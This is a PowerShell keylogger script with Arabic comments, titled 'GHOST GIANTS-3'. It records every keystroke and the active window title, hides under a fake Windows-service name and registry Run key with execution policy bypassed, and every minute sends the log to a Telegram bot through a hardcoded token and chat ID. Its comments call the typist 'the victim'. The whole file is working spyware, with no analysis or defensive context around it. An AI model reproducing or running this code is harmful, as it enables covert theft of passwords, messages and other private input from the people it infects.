# --- [STARK OMEGA: GHOST GIANTS-3] ---
# الوظيفة: راصد لوحة مفاتيح (Keylogger) احترافي مع إرسال تقرير كل دقيقة

$ErrorActionPreference = 'SilentlyContinue'

# الثوابت
$BOT_TOKEN = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$CHAT_ID = "7393359923"

# تعريف الربط مع مكتبة الويندوز الأساسية (User32.dll)
$Sign = @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern int GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(int hWnd, System.Text.StringBuilder lpString, int nMaxCount);
'@
$API = Add-Type -MemberDefinition $Sign -Name "Win32" -Namespace "Stark" -PassThru

# آلية البقاء (Persistence)
$path = "$env:APPDATA\Microsoft\Windows\System32_InputHost.ps1"
if (!(Test-Path $path)) {
    $MyContent = (New-Object Net.WebClient).DownloadString($MyInvocation.MyCommand.Definition)
    $MyContent | Out-File -FilePath $path
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsInputService' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
}

$Log = ""
$LastWin = ""
$Timer = [System.Diagnostics.Stopwatch]::StartNew()

while($true) {
    Start-Sleep -Milliseconds 40 # سرعة رصد عالية جداً
    
    # معرفة التطبيق الحالي الذي يكتب فيه الضحية
    $hWnd = $API::GetForegroundWindow()
    $Title = New-Object System.Text.StringBuilder 256
    $API::GetWindowText($hWnd, $Title, 256)
    
    if ($Title.ToString() -ne $LastWin) {
        $LastWin = $Title.ToString()
        $Log += "`n`n[Window: $LastWin] - $(Get-Date -Format 'HH:mm:ss')`n"
    }

    # حلقة فحص أزرار الكيبورد (من 8 إلى 255)
    for ($i = 8; $i -le 255; $i++) {
        $State = $API::GetAsyncKeyState($i)
        if ($State -eq -32767) {
            $Key = [System.Windows.Forms.Keys]$i
            $Log += "$Key "
        }
    }

    # الإرسال كل دقيقة (60 ثانية) إذا كان هناك داتا
    if ($Timer.Elapsed.TotalSeconds -ge 60) {
        if ($Log.Length -gt 20) {
            $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
            $body = @{ chat_id = $CHAT_ID; text = "<b>👻 تقرير الكيبورد (The Ghost):</b>`n<code>$Log</code>"; parse_mode = "HTML" }
            Invoke-RestMethod -Uri $url -Method Post -Body $body
            $Log = "" # تفريغ المخزن
        }
        $Timer.Restart()
    }
}
